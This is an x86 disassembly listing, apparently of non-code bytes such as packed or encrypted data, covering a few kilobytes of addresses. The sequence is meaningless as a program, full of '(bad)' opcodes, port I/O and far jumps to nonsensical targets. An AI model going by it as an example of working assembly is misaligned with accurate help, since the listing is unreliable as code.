  40a09a:	rcr    BYTE PTR [ecx+0x4ba2cda4],0x1
  40a0a1:	sub    bh,BYTE PTR [ebp-0x24]
  40a0a4:	fimul  DWORD PTR [ecx]
  40a0a6:	jg     0x40a0b7
  40a0a8:	ins    BYTE PTR es:[edi],dx
  40a0a9:	push   0xb85dba7e
  40a0ae:	enter  0x2f40,0xfc
  40a0b2:	xchg   BYTE PTR [edx],dl
  40a0b4:	push   0x3e6ed7d3
  40a0b9:	popa   
  40a0ba:	jne    0x40a0c3
  40a0bc:	dec    ebx
  40a0bd:	lahf   
  40a0be:	sub    bh,BYTE PTR [esi]
  40a0c0:	rcl    BYTE PTR [edx-0x1d],cl
  40a0c3:	in     al,dx
  40a0c4:	pop    edi
  40a0c5:	pop    ds
  40a0c6:	cdq    
  40a0c7:	js     0x40a07a
  40a0c9:	rcr    BYTE PTR [edx-0x23],cl
  40a0cc:	push   es
  40a0cd:	(bad)  
  40a0ce:	mov    eax,ds:0x8dd8b416
  40a0d3:	daa    
  40a0d4:	pop    eax
  40a0d5:	not    dh
  40a0d7:	sub    al,0x9c
  40a0d9:	cmc    
  40a0da:	daa    
  40a0db:	gs add al,0x60
  40a0de:	xchg   esp,eax
  40a0df:	xchg   DWORD PTR [esi+0x65972a05],ecx
  40a0e5:	pusha  
  40a0e6:	add    eax,eax
  40a0e8:	jl     0x40a0d9
  40a0ea:	fwait
  40a0eb:	jg     0x40a0e2
  40a0ed:	inc    edx
  40a0ee:	dec    esp
  40a0ef:	or     dl,ah
  40a0f1:	mov    ecx,0x4bcc0bc0
  40a0f6:	jmp    DWORD PTR [esi+0x18]
  40a0f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0fa:	add    ah,cl
  40a0fc:	and    BYTE PTR [eax+0x4788d06c],ch
  40a102:	fld    st(2)
  40a104:	outs   dx,DWORD PTR ds:[esi]
  40a105:	test   DWORD PTR [ecx],esp
  40a107:	arpl   WORD PTR [esp+ebx*2],bp
  40a10a:	cld    
  40a10b:	add    ebx,DWORD PTR [ebx-0x10]
  40a10e:	lods   al,BYTE PTR ds:[esi]
  40a10f:	xchg   esp,eax
  40a110:	sub    dh,BYTE PTR [ecx+0x17]
  40a113:	add    al,0x50
  40a115:	dec    eax
  40a116:	jbe    0x40a0f6
  40a118:	push   ds
  40a119:	fwait
  40a11a:	sahf   
  40a11b:	aas    
  40a11c:	popf   
  40a11d:	push   0x3c
  40a11f:	imul   esi,DWORD PTR [ebx],0xfffffff1
  40a122:	in     al,dx
  40a123:	fstp   TBYTE PTR [ecx-0x40]
  40a126:	bound  esi,QWORD PTR [ebp*2+0x16d78177]
  40a12d:	push   ecx
  40a12e:	int    0xe5
  40a130:	test   BYTE PTR [edi+0x53675a20],0xd
  40a137:	call   0x135e:0x20dc79ca
  40a13e:	not    bl
  40a140:	je     0x40a12f
  40a142:	repnz ins DWORD PTR es:[edi],dx
  40a144:	jne    0x40a107
  40a146:	add    al,0xc4
  40a148:	or     BYTE PTR [ecx],dh
  40a14a:	cmp    ebx,eax
  40a14c:	jmp    0xb8a2b6a3
  40a151:	mov    ebx,0xa2bdc8a6
  40a156:	sqrtps xmm1,xmm2
  40a159:	test   eax,0x6e068d07
  40a15e:	addr16 mov bh,0x73
  40a161:	out    0xc,al
  40a163:	pop    ds
  40a164:	(bad)  
  40a165:	aaa    
  40a166:	(bad)  
  40a167:	push   esp
  40a168:	test   al,0x4f
  40a16a:	mov    ?,WORD PTR [esi+0xbeae06f]
  40a170:	data16 mov dh,0x56
  40a173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a174:	pop    esi
  40a175:	(bad)  
  40a176:	(bad)  
  40a177:	iret   
  40a178:	ins    DWORD PTR es:[edi],dx
  40a179:	hlt    
  40a17a:	add    esp,DWORD PTR [edi]
  40a17c:	fisub  WORD PTR [edi-0x42d7405b]
  40a182:	adc    BYTE PTR [ebp-0x6a0a18b6],0x5d
  40a189:	call   0x401bb4aa
  40a18e:	adc    ebp,esp
  40a190:	loopne 0x40a1fc
  40a192:	xchg   esi,eax
  40a193:	push   cs
  40a194:	inc    eax
  40a195:	mov    ds:0x761023af,al
  40a19a:	rol    DWORD PTR [ecx-0x37],1
  40a19d:	push   0xafc588b1
  40a1a2:	outs   dx,BYTE PTR ds:[esi]
  40a1a3:	and    DWORD PTR [esi+0x1f],edi
  40a1a6:	push   eax
  40a1a7:	daa    
  40a1a8:	ins    BYTE PTR es:[edi],dx
  40a1a9:	pop    ecx
  40a1aa:	dec    eax
  40a1ab:	adc    DWORD PTR fs:[ebx+0x67],edx
  40a1af:	push   esi
  40a1b0:	stc    
  40a1b1:	(bad)  
  40a1b2:	(bad)  [edi-0x6a]
  40a1b5:	lea    ebx,[edx+0x529fd791]
  40a1bb:	fldenv [eax+0x21]
  40a1be:	xchg   edx,esp
  40a1c0:	inc    edx
  40a1c1:	sub    dl,BYTE PTR [edx]
  40a1c3:	sti    
  40a1c4:	pop    ebx
  40a1c5:	loop   0x40a1d3
  40a1c7:	mov    dh,0x64
  40a1c9:	cmp    al,0xc4
  40a1cb:	inc    ebx
  40a1cc:	jns    0x40a150
  40a1ce:	sbb    esi,edi
  40a1d0:	xlat   BYTE PTR ds:[ebx]
  40a1d1:	cmp    DWORD PTR [edx+0xd],ebx
  40a1d4:	or     BYTE PTR [edi+0x5d],ah
  40a1d7:	push   edx
  40a1d8:	mov    ebp,0x935e4222
  40a1dd:	jo     0x40a259
  40a1df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1e0:	pop    ecx
  40a1e1:	ins    BYTE PTR es:[edi],dx
  40a1e2:	sbb    ch,bl
  40a1e4:	ret    
  40a1e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1e6:	push   ebp
  40a1e7:	cmp    ah,BYTE PTR [edx+ecx*4+0x356198b7]
  40a1ee:	je     0x40a241
  40a1f0:	das    
  40a1f1:	scas   eax,DWORD PTR es:[edi]
  40a1f2:	mov    ah,0x65
  40a1f4:	add    bl,BYTE PTR [esi+esi*2-0x56]
  40a1f8:	enter  0x2de2,0x8a
  40a1fc:	outs   dx,BYTE PTR ds:[esi]
  40a1fd:	cmp    eax,esi
  40a1ff:	pop    ds
  40a200:	sub    ch,BYTE PTR [ebx+0x6e9c46df]
  40a206:	in     eax,dx
  40a207:	inc    eax
  40a208:	test   DWORD PTR [ebp-0x794b66aa],edi
  40a20e:	lds    ecx,FWORD PTR [ecx]
  40a210:	pop    esi
  40a211:	mov    ch,0xa5
  40a213:	mov    edx,0xc95f49a6
  40a218:	retf   
  40a219:	adc    ah,BYTE PTR [ecx]
  40a21b:	ficom  DWORD PTR [edx-0x7426046a]
  40a221:	sbb    dh,BYTE PTR [edx+0x74]
  40a224:	mov    WORD PTR [ebx+ebp*1+0x1d],?
  40a228:	mov    ch,0x4f
  40a22a:	xor    ecx,DWORD PTR [edx-0x728b2061]
  40a230:	pusha  
  40a231:	stos   BYTE PTR es:[edi],al
  40a232:	data16 add bh,BYTE PTR [ebx+0x1b1f8726]
  40a239:	das    
  40a23a:	aam    0x4d
  40a23c:	push   esp
  40a23d:	divps  xmm7,XMMWORD PTR ds:0xb2fb194a
  40a244:	mov    DWORD PTR [esi],edx
  40a246:	(bad)  
  40a247:	push   ss
  40a248:	fdiv   DWORD PTR [ebp-0x5e]
  40a24b:	xor    DWORD PTR [esi],esp
  40a24d:	lock sbb eax,0x5aa8f8d9
  40a253:	inc    ebp
  40a254:	push   edx
  40a255:	push   esi
  40a256:	mov    ebx,eax
  40a258:	lock test eax,0xeb01b6fd
  40a25e:	retf   
  40a25f:	stos   BYTE PTR es:[edi],al
  40a260:	cmp    eax,0x8852a0a6
  40a265:	push   ebx
  40a266:	outs   dx,BYTE PTR ds:[esi]
  40a267:	push   0x4f
  40a269:	addr16 mov bh,0xf2
  40a26c:	cmovle ecx,DWORD PTR [esi]
  40a26f:	mov    edi,0xe6b47e11
  40a274:	inc    ecx
  40a275:	(bad)  
  40a276:	jnp    0x40a282
  40a278:	jge    0x40a233
  40a27a:	mov    ebp,0xf9889b9e
  40a27f:	jmp    0x3c316df3
  40a284:	pop    ds
  40a285:	inc    ebx
  40a286:	add    cl,BYTE PTR [edi-0x668b4439]
  40a28c:	mov    ah,0x9a
  40a28e:	add    cl,0x3a
  40a291:	jmp    0x3766:0x1029ec45
  40a298:	jns    0x40a21f
  40a29a:	call   0x4442:0x9cb33c12
  40a2a1:	adc    eax,0xd5bdea43
  40a2a6:	add    BYTE PTR [ebp-0x595be814],dh
  40a2ac:	sti    
  40a2ad:	sbb    eax,0x3b238440
  40a2b2:	ss ss sbb bl,dl
  40a2b6:	xor    eax,0x5a4a6a35
  40a2bb:	sbb    BYTE PTR [ebx-0x100ecf4a],ah
  40a2c1:	push   ss
  40a2c2:	int    0xaa
  40a2c4:	(bad)  
  40a2c5:	push   edi
  40a2c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2c7:	mov    ch,0xc9
  40a2c9:	push   ss
  40a2ca:	jle    0x40a318
  40a2cc:	ret    
  40a2cd:	ret    0x27e
  40a2d0:	xchg   ebx,eax
  40a2d1:	mov    ah,0x18
  40a2d3:	inc    esi
  40a2d4:	out    dx,al
  40a2d5:	sbb    bl,BYTE PTR [eax+0x106741fc]
  40a2db:	pushf  
  40a2dc:	mov    bh,0xbc
  40a2de:	sub    BYTE PTR [eax-0x30],al
  40a2e1:	or     DWORD PTR [edx-0x20],edx
  40a2e4:	sbb    DWORD PTR [edx-0x4be3c093],edx
  40a2ea:	cmp    BYTE PTR [edi+0x63f4b70e],0x24
  40a2f1:	pop    esi
  40a2f2:	loopne 0x40a2ee
  40a2f4:	cld    
  40a2f5:	and    esi,DWORD PTR [eax+0x1e]
  40a2f8:	stos   DWORD PTR es:[edi],eax
  40a2f9:	mov    al,0x67
  40a2fb:	mov    dl,0x30
  40a2fd:	in     eax,dx
  40a2fe:	mov    WORD PTR [edi-0x23],es
  40a301:	pop    esi
  40a302:	inc    edx
  40a303:	call   edi
  40a305:	inc    edx
  40a306:	shr    DWORD PTR [ebx],1
  40a308:	jp     0x40a326
  40a30a:	(bad)  
  40a30b:	hlt    
  40a30c:	push   0xa5884b78
  40a311:	pop    edi
  40a312:	xchg   edx,eax
  40a313:	loop   0x40a2dd
  40a315:	push   eax
  40a316:	mov    edi,0xdd1df296
  40a31b:	lods   al,BYTE PTR ds:[esi]
  40a31c:	sub    eax,0x950f99d8
  40a321:	daa    
  40a322:	fimul  DWORD PTR [eax-0x26]
  40a325:	das    
  40a326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a327:	pop    esi
  40a328:	cwde   
  40a329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a32a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a32b:	sub    al,0xbb
  40a32d:	sub    DWORD PTR [ecx+ebp*8+0x79],ebx
  40a331:	cmp    BYTE PTR [ecx+0x3b9b60b],ch
  40a337:	or     al,0xcd
  40a339:	dec    eax
  40a33a:	lods   eax,DWORD PTR ds:[esi]
  40a33b:	fild   DWORD PTR [esi-0x14bf755e]
  40a341:	out    dx,eax
  40a342:	pusha  
  40a343:	push   ecx
  40a344:	fbld   TBYTE PTR [eax+0x7947af44]
  40a34a:	in     al,0xb1
  40a34c:	mov    al,0x54
  40a34e:	push   ebp
  40a34f:	mov    bl,0x4b
  40a351:	rol    eax,cl
  40a353:	jmp    0xf8c18945
  40a358:	loope  0x40a30d
  40a35a:	shr    BYTE PTR [esi],0x71
  40a35d:	in     eax,dx
  40a35e:	imul   eax,DWORD PTR [eax],0xa676ba13
  40a364:	stos   DWORD PTR es:[edi],eax
  40a365:	jp     0x40a362
  40a367:	jmp    0xb994:0x5d6457f2
  40a36e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a36f:	dec    esp
  40a370:	loop   0x40a320
  40a372:	pop    ss
  40a373:	sahf   
  40a374:	jp     0x40a31d
  40a376:	sbb    dh,BYTE PTR [esp+edx*4]
  40a379:	repz mov ebp,DWORD PTR [eax+0x1]
  40a37d:	inc    edx
  40a37e:	push   0x1b652153
  40a383:	mov    edx,0xb81d1e5a
  40a388:	adc    ebp,DWORD PTR [esi+ebp*2]
  40a38b:	adc    edi,DWORD PTR [edi-0x533a053d]
  40a391:	addr16 cmp bl,bh
  40a394:	and    bh,BYTE PTR [esi+0x2e]
  40a397:	sub    DWORD PTR [edi+0x3],ebx
  40a39a:	cdq    
  40a39b:	jno    0x40a3bf
  40a39d:	fstp   TBYTE PTR [edi]
  40a39f:	repnz sub BYTE PTR [ebp-0x46],ch
  40a3a3:	mov    dh,BYTE PTR [ebp+0x37]
  40a3a6:	adc    eax,0xdca5a655
  40a3ab:	outs   dx,BYTE PTR ds:[esi]
  40a3ac:	or     dl,BYTE PTR [edi-0x34]
  40a3af:	iret   
  40a3b0:	dec    DWORD PTR [ebx-0x36]
  40a3b3:	pop    edx
  40a3b4:	retf   0x7735
  40a3b7:	and    edx,DWORD PTR [edi]
  40a3b9:	dec    eax
  40a3ba:	jne    0x40a42c
  40a3bc:	out    0x1b,eax
  40a3be:	rol    DWORD PTR ds:0x8752f11c,cl
  40a3c4:	ror    ah,1
  40a3c6:	pop    eax
  40a3c7:	stc    
  40a3c8:	mov    esp,0xb789f1c8
  40a3cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3ce:	jno    0x40a36d
  40a3d0:	out    dx,al
  40a3d1:	xor    bh,BYTE PTR [ebx]
  40a3d3:	aas    
  40a3d4:	je     0x40a431
  40a3d6:	mov    dl,0x4a
  40a3d8:	mov    esp,0xda6d4d1a
  40a3dd:	ins    DWORD PTR es:[edi],dx
  40a3de:	enter  0x834c,0x73
  40a3e2:	and    al,0xb3
  40a3e4:	cmp    al,0xb4
  40a3e6:	icebp  
  40a3e7:	sbb    esp,DWORD PTR [edx]
  40a3e9:	imul   esi,esi,0x7c
  40a3ec:	mov    WORD PTR [ecx+eax*1-0x13],es
  40a3f0:	dec    ebp
  40a3f1:	jbe    0x40a3ea
  40a3f3:	je     0x40a3df
  40a3f5:	mov    eax,0x79e9990b
  40a3fa:	lahf   
  40a3fb:	pop    eax
  40a3fc:	xchg   edi,eax
  40a3fd:	mov    DWORD PTR [esi-0x48],eax
  40a400:	dec    edi
  40a401:	xchg   edi,eax
  40a402:	retf   0xb76e
  40a405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a406:	cmp    ebx,DWORD PTR [ebp+0x5a]
  40a409:	xchg   ebx,eax
  40a40a:	scas   al,BYTE PTR es:[edi]
  40a40b:	jl     0x40a43d
  40a40d:	test   ecx,ecx
  40a40f:	idiv   bl
  40a411:	dec    eax
  40a412:	fs mov ebp,esi
  40a415:	push   esi
  40a416:	out    0xbb,al
  40a418:	xor    dh,cl
  40a41a:	mov    ebx,0xef4f5b41
  40a41f:	or     DWORD PTR [eax],ebp
  40a421:	inc    eax
  40a422:	jmp    0x5769:0xd02a8b1d
  40a429:	adc    dh,BYTE PTR [eax+0x42]
  40a42c:	dec    ebp
  40a42d:	ret    
  40a42e:	xchg   DWORD PTR ds:0xd5b6a63f,esi
  40a434:	pop    ecx
  40a435:	aad    0x46
  40a437:	enter  0x7bcb,0xfc
  40a43b:	fbstp  TBYTE PTR [edi-0x6d8d258c]
  40a441:	ret    
  40a442:	mov    cl,0xe4
  40a444:	ins    BYTE PTR es:[edi],dx
  40a445:	xor    BYTE PTR [esi],al
  40a447:	lods   al,BYTE PTR ds:[esi]
  40a448:	js     0x40a480
  40a44a:	out    0xe5,eax
  40a44c:	scas   al,BYTE PTR es:[edi]
  40a44d:	in     eax,dx
  40a44e:	aas    
  40a44f:	jo     0x40a413
  40a451:	loopne 0x40a406
  40a453:	jbe    0x40a407
  40a455:	jbe    0x40a3ef
  40a457:	and    edi,edi
  40a459:	dec    ebp
  40a45a:	scas   al,BYTE PTR es:[edi]
  40a45b:	pop    ebp
  40a45c:	loop   0x40a420
  40a45e:	shr    ecx,1
  40a460:	rcl    cl,1
  40a462:	daa    
  40a463:	mov    esp,gs
  40a465:	inc    ecx
  40a466:	add    ah,ah
  40a468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a469:	sub    DWORD PTR [ebp-0x5e],0x2aacbcff
  40a470:	xchg   esi,eax
  40a471:	retf   0xd0af
  40a474:	fist   WORD PTR [esi+0x67]
  40a477:	(bad)  
  40a478:	cld    
  40a479:	jg     0x40a426
  40a47b:	sub    eax,0x68efc924
  40a480:	retf   0xa9b1
  40a483:	adc    eax,0xcdfedd0a
  40a488:	ins    DWORD PTR es:[edi],dx
  40a489:	jb     0x40a4fa
  40a48b:	and    al,0x70
  40a48d:	jp     0x40a4c0
  40a48f:	xchg   ebp,eax
  40a490:	leave  
  40a491:	inc    esi
  40a492:	repnz nop
  40a494:	xchg   ebp,eax
  40a495:	mov    eax,ds:0xc2a93574
  40a49a:	add    dl,al
  40a49c:	nop
  40a49d:	jmp    0x7ddc0714
  40a4a2:	popa   
  40a4a3:	sahf   
  40a4a4:	fidiv  WORD PTR [edi+ebp*8]
  40a4a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4a8:	adc    DWORD PTR [edi-0x1905e798],ebp
  40a4ae:	push   ebp
  40a4af:	js     0x40a478
  40a4b1:	sahf   
  40a4b2:	push   eax
  40a4b3:	jns    0x40a4af
  40a4b5:	lahf   
  40a4b6:	push   es
  40a4b7:	sub    al,0xea
  40a4b9:	icebp  
  40a4ba:	shl    al,0xb4
  40a4bd:	jbe    0x40a507
  40a4bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4c0:	add    al,0xb3
  40a4c2:	jnp    0x40a4bc
  40a4c4:	sti    
  40a4c5:	dec    ecx
  40a4c6:	dec    eax
  40a4c7:	(bad)  
  40a4c8:	std    
  40a4c9:	lods   al,BYTE PTR ds:[esi]
  40a4ca:	sub    BYTE PTR [eax+0x7880a850],ch
  40a4d0:	jmp    0xc47919fc
  40a4d5:	sub    ah,BYTE PTR [esi]
  40a4d7:	pop    es
  40a4d8:	push   cs
  40a4d9:	daa    
  40a4da:	inc    eax
  40a4db:	adc    BYTE PTR [esi+0x7f],ch
  40a4de:	fsub   DWORD PTR [esi]
  40a4e0:	push   ds
  40a4e1:	int3   
  40a4e2:	pop    ss
  40a4e3:	(bad)  
  40a4e4:	je     0x40a4f7
  40a4e6:	sbb    eax,0xe88e8e95
  40a4eb:	mov    ds:0x315e178b,eax
  40a4f0:	cwde   
  40a4f1:	cmp    eax,0x884e239
  40a4f6:	icebp  
  40a4f7:	repz aaa 
  40a4f9:	xor    ebx,DWORD PTR [ebx]
  40a4fb:	mov    ebp,0x77a7e070
  40a500:	(bad)  
  40a501:	call   0x6d06:0x306e7da0
  40a508:	mov    ah,0x1c
  40a50a:	jge    0x40a555
  40a50c:	into   
  40a50d:	xchg   esi,esi
  40a50f:	mov    bh,0x8f
  40a511:	aad    0xfc
  40a513:	imul   edi,DWORD PTR [edx-0x2e069a99],0x5b732bd5
  40a51d:	lods   al,BYTE PTR ds:[esi]
  40a51e:	push   esp
  40a51f:	in     al,dx
  40a520:	jmp    0x40a534
  40a522:	sbb    BYTE PTR [ebp-0x16],0x32
  40a526:	loopne 0x40a542
  40a528:	iret   
  40a529:	test   ebx,eax
  40a52b:	xor    ecx,DWORD PTR [edx-0x2ed4dbeb]
  40a531:	stos   BYTE PTR es:[edi],al
  40a532:	xor    DWORD PTR [eax],ebx
  40a534:	js     0x40a5ac
  40a536:	mov    es,WORD PTR [ebp+0xca3678f]
  40a53c:	xlat   BYTE PTR ds:[ebx]
  40a53d:	push   edx
  40a53e:	popf   
  40a53f:	pop    ds
  40a540:	dec    eax
  40a541:	in     eax,0x63
  40a543:	pop    es
  40a544:	int3   
  40a545:	pop    edx
  40a546:	aam    0xe6
  40a548:	cwde   
  40a549:	xor    al,0x7c
  40a54b:	aad    0xbd
  40a54d:	cmp    al,0x3f
  40a54f:	retf   0xc3e7
  40a552:	dec    esp
  40a553:	or     eax,0x5c8af190
  40a558:	sub    al,0x7e
  40a55a:	iret   
  40a55b:	adc    al,0xe9
  40a55d:	in     eax,dx
  40a55e:	clc    
  40a55f:	out    0x7e,al
  40a561:	pop    ebp
  40a562:	and    ch,BYTE PTR [eax-0x642de07d]
  40a568:	es addr16 xchg edi,eax
  40a56b:	ins    DWORD PTR es:[edi],dx
  40a56c:	and    ebp,edx
  40a56e:	dec    edx
  40a56f:	xchg   BYTE PTR [edx+ecx*8-0x2e],dh
  40a573:	fst    DWORD PTR ds:0xb92b2770
  40a579:	ja     0x40a58d
  40a57b:	(bad)  
  40a57c:	mov    ah,0x58
  40a57e:	clc    
  40a57f:	jo     0x40a5f8
  40a581:	push   ss
  40a582:	les    edi,FWORD PTR [edx+0x10]
  40a585:	mov    bl,0x99
  40a587:	push   eax
  40a588:	and    eax,0xad4c63ef
  40a58d:	fwait
  40a58e:	adc    DWORD PTR [ecx],0xb89dffd7
  40a594:	in     al,dx
  40a595:	rcr    BYTE PTR [edx+0x2f],cl
  40a598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a599:	int    0x98
  40a59b:	xlat   BYTE PTR ds:[ebx]
  40a59c:	inc    ecx
  40a59d:	pop    edi
  40a59e:	add    BYTE PTR [eax-0x2e],bh
  40a5a1:	jle    0x40a618
  40a5a3:	lahf   
  40a5a4:	sbb    dh,BYTE PTR [edx+0x6]
  40a5a7:	mov    edx,0x899b67f5
  40a5ac:	mov    DWORD PTR [ebx-0x40],esp
  40a5af:	(bad)  
  40a5b0:	jle    0x40a558
  40a5b2:	xchg   al,ch
  40a5b4:	add    bh,dh
  40a5b6:	sbb    al,dl
  40a5b8:	xchg   esp,eax
  40a5b9:	adc    BYTE PTR ds:0x30b881e3,bh
  40a5bf:	lods   al,BYTE PTR ds:[esi]
  40a5c0:	xchg   ebx,eax
  40a5c1:	add    eax,0x4192c18f
  40a5c6:	sbb    eax,0x2802662c
  40a5cb:	cwde   
  40a5cc:	mov    bh,0xa7
  40a5ce:	pop    ecx
  40a5cf:	and    al,0x3c
  40a5d1:	push   edi
  40a5d2:	mov    bh,BYTE PTR [edi+0x55e4321d]
  40a5d8:	fsub   st,st(2)
  40a5da:	stos   DWORD PTR es:[edi],eax
  40a5db:	ja     0x40a649
  40a5dd:	(bad)  
  40a5de:	mov    ebp,0x880e6c65
  40a5e3:	mov    al,0x65
  40a5e5:	lods   al,BYTE PTR ds:[esi]
  40a5e6:	jp     0x40a5bb
  40a5e8:	test   DWORD PTR [ecx],ebp
  40a5ea:	rcr    dh,1
  40a5ec:	push   cs
  40a5ed:	pop    edx
  40a5ee:	cmc    
  40a5ef:	pusha  
  40a5f0:	sti    
  40a5f1:	aam    0xcb
  40a5f3:	sahf   
  40a5f4:	std    
  40a5f5:	inc    esi
  40a5f6:	jg     0x40a66d
  40a5f8:	out    dx,al
  40a5f9:	xchg   edx,eax
  40a5fa:	cmp    DWORD PTR [ecx],0xa71f41c3
  40a600:	shl    BYTE PTR [edi-0x61],cl
  40a603:	(bad)  
  40a605:	(bad)  
  40a606:	retf   
  40a607:	push   ds
  40a608:	cmp    eax,0x4124dc6
  40a60d:	into   
  40a60e:	xor    eax,0x64428ea8
  40a613:	dec    edx
  40a614:	dec    bh
  40a616:	mov    bl,0xbe
  40a618:	sbb    al,0xeb
  40a61a:	(bad)  
  40a61b:	idiv   DWORD PTR [edi-0x63]
  40a61e:	aas    
  40a61f:	adc    al,0xa3
  40a621:	rol    DWORD PTR [edi],cl
  40a623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a624:	mov    BYTE PTR [edi+eiz*2-0x72b3fcc9],bl
  40a62b:	jp     0x40a650
  40a62d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a62e:	sar    cl,1
  40a630:	test   DWORD PTR ds:0x723807b2,edx
  40a636:	xchg   ebx,eax
  40a637:	fwait
  40a638:	cmp    al,0xdc
  40a63a:	add    al,0x5c
  40a63c:	cmp    DWORD PTR [esi+0x29],0xb10a672a
  40a643:	xchg   cl,cl
  40a645:	adc    al,ch
  40a647:	ins    DWORD PTR es:[edi],dx
  40a648:	jnp    0x40a5e4
  40a64a:	(bad)  
  40a64b:	xor    eax,0x3a08389a
  40a650:	and    BYTE PTR [eax+0x5c],bh
  40a653:	sbb    DWORD PTR [eax+0x73],ebx
  40a656:	int    0x13
  40a658:	xchg   ecx,eax
  40a659:	push   ss
  40a65a:	lea    esi,[ebp-0x5e]
  40a65d:	sub    al,0xfb
  40a65f:	repnz clc 
  40a661:	adc    DWORD PTR [ebp+0x2e11b145],ebp
  40a667:	arpl   WORD PTR [ebp-0x1dc7df26],si
  40a66d:	pop    esp
  40a66e:	inc    esi
  40a66f:	loopne 0x40a6a4
  40a671:	ja     0x40a66e
  40a673:	xchg   BYTE PTR [ecx-0x20c19392],dl
  40a679:	mov    edx,0x647427a9
  40a67e:	push   ss
  40a67f:	outs   dx,BYTE PTR ds:[esi]
  40a680:	outs   dx,DWORD PTR cs:[esi]
  40a682:	jno    0x40a60a
  40a684:	inc    esi
  40a685:	inc    ebp
  40a686:	shl    ebx,0xbe
  40a689:	dec    esp
  40a68a:	cld    
  40a68b:	push   eax
  40a68c:	(bad)  
  40a68d:	not    BYTE PTR [eax-0x3b]
  40a690:	push   eax
  40a691:	push   ss
  40a692:	jbe    0x40a705
  40a694:	add    BYTE PTR [ecx+0x8333e5b],bh
  40a69a:	xchg   edx,eax
  40a69b:	dec    ecx
  40a69c:	shl    DWORD PTR [eax+0x65dee572],1
  40a6a2:	data16 into 
  40a6a4:	ret    
  40a6a5:	add    ch,BYTE PTR [eax+0x14d8c085]
  40a6ab:	push   edx
  40a6ac:	test   DWORD PTR [ecx-0x77],esp
  40a6af:	mov    ?,WORD PTR [ebp+0x5bddda44]
  40a6b5:	sahf   
  40a6b6:	aaa    
  40a6b7:	and    eax,0xfe493a7c
  40a6bc:	mov    BYTE PTR [esi+0x20],0x30
  40a6c0:	(bad)  
  40a6c1:	mov    dh,0x63
  40a6c3:	xchg   ebp,eax
  40a6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6c5:	cld    
  40a6c6:	pop    eax
  40a6c7:	popf   
  40a6c8:	xchg   DWORD PTR [eax+ebp*2],ecx
  40a6cb:	push   es
  40a6cc:	pop    eax
  40a6cd:	(bad)  
  40a6ce:	div    BYTE PTR [ecx+ecx*8]
  40a6d1:	push   edx
  40a6d2:	jo     0x40a70e
  40a6d4:	out    dx,al
  40a6d5:	cli    
  40a6d6:	mov    edi,0xf18547ec
  40a6db:	cmp    al,0xff
  40a6dd:	xchg   ebp,eax
  40a6de:	mov    eax,0x90efc26e
  40a6e3:	jmp    0xfda6aad6
  40a6e8:	adc    ebx,esp
  40a6ea:	pop    ecx
  40a6eb:	xor    bl,BYTE PTR [ecx+0x1a2b0571]
  40a6f1:	sahf   
  40a6f2:	jp     0x40a753
  40a6f4:	test   BYTE PTR [esi],ah
  40a6f6:	fisttp DWORD PTR [esi]
  40a6f8:	and    eax,0xfc75e530
  40a6fd:	popf   
  40a6fe:	mov    ecx,0xe217435d
  40a703:	outs   dx,DWORD PTR ds:[esi]
  40a704:	push   ss
  40a705:	xor    eax,DWORD PTR [eax-0x16]
  40a708:	xchg   ecx,eax
  40a709:	aad    0x75
  40a70b:	add    dh,al
  40a70d:	lds    esp,FWORD PTR [eax]
  40a70f:	lods   eax,DWORD PTR ds:[esi]
  40a710:	xchg   esp,eax
  40a712:	jle    0x40a75f
  40a714:	inc    ecx
  40a715:	shl    BYTE PTR [edi+0x1044c68c],cl
  40a71b:	jge    0x40a6a7
  40a71d:	mov    ebp,0xbfefbd53
  40a722:	in     al,dx
  40a723:	inc    edi
  40a724:	lea    ebp,[edi]
  40a726:	int    0x7e
  40a728:	pushf  
  40a729:	ins    BYTE PTR es:[edi],dx
  40a72a:	push   esi
  40a72b:	sbb    DWORD PTR [edi+0x7a],esi
  40a72e:	stc    
  40a72f:	cmp    al,0x82
  40a731:	xchg   esi,eax
  40a732:	ds or  BYTE PTR gs:[si+0x6f15],0x99
  40a73a:	call   0x15fe:0xefefe010
  40a741:	sbb    BYTE PTR ds:0x9c7eda9e,dl
  40a747:	jns    0x40a741
  40a749:	add    BYTE PTR [edx+edx*4],ah
  40a74c:	push   esi
  40a74d:	jge    0x40a7b4
  40a74f:	jg     0x40a713
  40a751:	bound  esi,QWORD PTR [ebp-0x60]
  40a754:	or     al,0x93
  40a756:	jmp    0x40a7b6
  40a758:	inc    eax
  40a759:	imul   eax,esp,0x2e9dc738
  40a75f:	lock sar ebp,1
  40a762:	xchg   ecx,eax
  40a763:	lea    ebp,[edx+edi*2-0x47]
  40a767:	push   ebx
  40a768:	arpl   WORD PTR [ebx-0x35],si
  40a76b:	jns    0x40a798
  40a76d:	mov    ebp,0xd7d20f83
  40a772:	dec    ebx
  40a773:	(bad)  
  40a774:	rcr    DWORD PTR [edi],cl
  40a776:	iret   
  40a777:	xchg   DWORD PTR [ebx-0x4de5b45c],edi
  40a77d:	xchg   esi,eax
  40a77e:	xchg   esi,eax
  40a77f:	rol    DWORD PTR [ecx],1
  40a781:	iret   
  40a782:	mov    bh,0x7c
  40a784:	cwde   
  40a785:	in     eax,dx
  40a786:	mov    WORD PTR [ebx+0x4e622595],cs
  40a78c:	sbb    ecx,ecx
  40a78e:	mov    esi,0x2083b564
  40a793:	nop
  40a794:	mov    dl,0x58
  40a796:	test   al,0xd1
